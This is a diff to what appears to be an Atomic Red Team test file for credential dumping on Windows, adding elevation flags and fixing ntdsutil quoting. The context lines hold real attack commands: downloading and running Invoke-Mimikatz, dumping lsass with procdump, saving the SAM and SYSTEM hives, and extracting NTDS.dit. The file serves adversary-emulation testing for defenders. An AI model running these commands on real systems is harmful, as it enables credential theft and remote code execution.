@@ -15,6 +15,7 @@ atomic_tests:
       default: https://raw.githubusercontent.com/EmpireProject/Empire/dev/data/module_source/credentials/Invoke-Mimikatz.ps1
   executor:
     name: powershell
+    elevation_required: true
     command: |
       IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
 
@@ -25,6 +26,7 @@ atomic_tests:
     - windows
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       gsecdump -a
 
@@ -40,6 +42,7 @@ atomic_tests:
       default: output.txt
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       wce -o #{output_file}
 
@@ -51,6 +54,7 @@ atomic_tests:
     - windows
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       reg save HKLM\sam sam
       reg save HKLM\system system
@@ -68,6 +72,7 @@ atomic_tests:
       type: Path
       default: lsass_dump.dmp
   executor:
+    elevation_required: true
     name: command_prompt
     command: |
       procdump.exe -accepteula -ma lsass.exe #{output_file}
@@ -130,8 +135,9 @@ atomic_tests:
       default: C:\Atomic_Red_Team
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
-      ntdsutil “ac i ntds” “ifm” “create full #{output_folder} q q
+      ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
 
 - name: Create Volume Shadow Copy with NTDS.dit
   description: |
@@ -145,6 +151,7 @@ atomic_tests:
       default: "C:"
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       vssadmin.exe create shadow /for=#{drive_letter}
 
@@ -168,6 +175,7 @@ atomic_tests:
       default: C:\Extract
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
       copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
